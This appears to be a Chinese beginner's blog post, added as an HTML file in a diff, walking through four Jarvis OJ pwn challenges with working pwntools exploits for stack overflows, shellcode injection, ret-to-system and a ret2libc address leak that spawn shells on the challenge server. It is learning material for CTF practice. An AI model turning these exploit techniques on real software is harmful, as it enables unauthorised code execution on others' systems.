@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>简单pwn题入门学习 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-text">level3 </span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">简单pwn题入门学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 24, 2018&nbsp;&nbsp;14:53:57</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>一只web菜狗来入门pwn?就简单学习一下一些简单的pwn题吧</p>
+<a id="more"></a>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>事先使用binwalk查看二进制脚本信息</p>
+<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
+---------------------------------------------------------------------    -----------
+0             0x0             ELF, 64-bit LSB executable, AMD x86-64,     version 1 (SYSV)</code></pre><p>可以看出来是一个64位的文件。<br>加载入相应都64位IDA中发现两个函数。<br>read函数读取了0x200个字符<br>查看buf大小<br>低位：0x0000000000000080<br>高位：+0x0000000000000008<br>所以buf的首地址到返回地址共=(+0x0000000000000008) - (-0x0000000000000080)=0x88<br>而read函数却读取了0x200，完全可以覆盖掉buf的ret造成栈溢出，这样只要获得到callsystem的地址，填充掉88个字符再加上callsystem的地址就可以使程序跳转到callsystem执行/bin/sh<br>—EXP如下</p>
+<pre><code>from pwn import *
+
+r = remote(&apos;pwn2.jarvisoj.com&apos;,&apos; 9881&apos;);
+elf = ELF(&apos;./level0.b9ded3801d6dd36a97468e128b81a65d&apos;)
+
+pad = &apos;a&apos;*0x88
+#add = p64(0x400596)
+add = elf.symbols[&apos;callsystem&apos;]
+payload = pad+p32(add)
+r.send(payload)
+r.interactive()</code></pre><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>level1 和level0 的源码类似，不过在运行程序后发现它输出一段地址。<br>通过IDA 可以发现输出的地址就是bss的地址，而程序并没有限制栈不可写，<br>于是思路就是构造一个一个shellcode输入到bss段，在劫持程序跳转到bss上且执行shellcode。</p>
+<p>参考EXP如下</p>
+<pre><code>from pwn import *
+
+shellcode = asm(shellcraft.sh()) #使用pwntools自带都shellcode
+
+io = remote(&apos;pwn2.jarvisoj.com&apos;,9877)
+
+text = io.recvline()[14:-2] #获取程序输出都buf地址
+
+buf_addr = int(text,16)
+
+payload = shellcode + &apos;a&apos;*(0x88+0x04-len(shellcode)) + p32(buf_addr)
+
+io.send(payload)
+
+io.interactive()
+io.close()</code></pre><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>惯例丢到binwalk，IDA查看程序基本流程，与前面都程序无太大都差异。<br>程序中自带一个有system函数以及/bin/sh 字符串。那么思路就是构造一个栈桢为system(‘/bin/sh’)来达到getshell的目的。<br>第一个步：找到system的地址以及/bin/sh的地址，可以通过IDA或者ELF模块来寻找。<br>第二步：构造栈模拟system调用过程。 要注意都是在调用函数都过程会将返回地址先压栈，这里为们随意都填上8个字节即0x12345678，然后才是参数入栈。ps：这点对于之后都二次溢出是很重要的。</p>
+<p>参考EXP如下</p>
+<pre><code>from pwn import *
+
+elf=ELF(&apos;./level2.54931449c557d0551c4fc2a10f4778a1&apos;)
+
+sys_add= elf.symbols[&apos;system&apos;] 
+
+sh_add = elf.search(&apos;/bin/sh&apos;).next() 
+
+payload = &apos;a&apos;*(0x88+0x4) + p32(sys_add) + p32(0x12345678) +     p32(sh_add)
+io = remote(&apos;pwn2.jarvisoj.com&apos;,9878)
+
+io.sendlineafter(&quot;Input:\n&quot;,payload)
+io.interactive()
+io.close()</code></pre><h2 id="level3"><a href="#level3" class="headerlink" title="level3 "></a>level3 </h2><p>level3主要是一个通过已知的libc文件来推算程序具体函数的练习。<br>原理google ret2libc。<br>这题有NX保护，也就是说bss段写入数据也无法执行。程序中也并没用system函数和’/bin/sh’字符串，无法像上一题一样构造栈。<br>题目给出了libc文件，通过ret2libc技术可以通过libc文件推算出任意函数所在的内存地址。<br>那么思路就是，先通过write函数将read函数都地址泄漏出来（不一定是要read函数，write也行，主要是用来算偏移量。而这两个函数在plt表和got表是存在的，所以比较方便）然后得到都地址与libc中的read函数都地址相减，得到偏移量。这样各个函数都的具体位置都可以由这个偏移量计算出来。即偏移量减去libc中对应函数的地址。<br>这样计算出了system函数地址以及’/bin/sh’地址就可以如上一题一样构造栈，达到getshell。<br>注意的是，payload1中利用write函数泄露地址，在调用write的函数的时候返回地址是给了vul这个函数。这样保证了程序在第一次溢出不会结束，而是陷入一次循环，避免了程序重启以后地址不一样。<br>参考EXP如下</p>
+<pre><code>from pwn import *                                               
+conn=remote(&quot;pwn2.jarvisoj.com&quot;,&quot;9879&quot;)
+libc=ELF(&apos;./libc-2.19.so&apos;)
+e=ELF(&apos;./level3&apos;)
+pad=0x88
+vulfun_addr=0x0804844B  
+write_plt=e.symbols[&apos;write&apos;] 
+read_got=e.got[&apos;read&apos;] 
+
+payload1=&apos;A&apos;*pad+&quot;BBBB&quot;+p32(write_plt)+p32(vulfun_addr)+p32(1)+p32(read_got)+p32(4)
+conn.recvuntil(&quot;Input:\n&quot;)
+conn.sendline(payload1)
+
+read_addr=u32(conn.recv(4))
+
+#calculate the system_address in memory
+libc_write=libc.symbols[&apos;read&apos;]
+libc_system=libc.symbols[&apos;system&apos;]
+libc_sh=libc.search(&apos;/bin/sh&apos;).next()
+
+system_addr=read_addr-libc_write+libc_system 
+sh_addr=read_addr-libc_write+libc_sh
+
+payload2=&apos;A&apos;*pad+&quot;BBBB&quot;+p32(system_addr)+&quot;dead&quot;+p32(sh_addr)
+conn.sendline(payload2)
+conn.interactive()</code></pre>
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/08/24/pwn/">http://yoursite.com/2018/08/24/pwn/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/08/25/upload-labs/">upload-labs前八关总结</a>
+            
+            
+            <a class="next" rel="next" href="/2018/08/24/SQL-study/">SQL-study</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
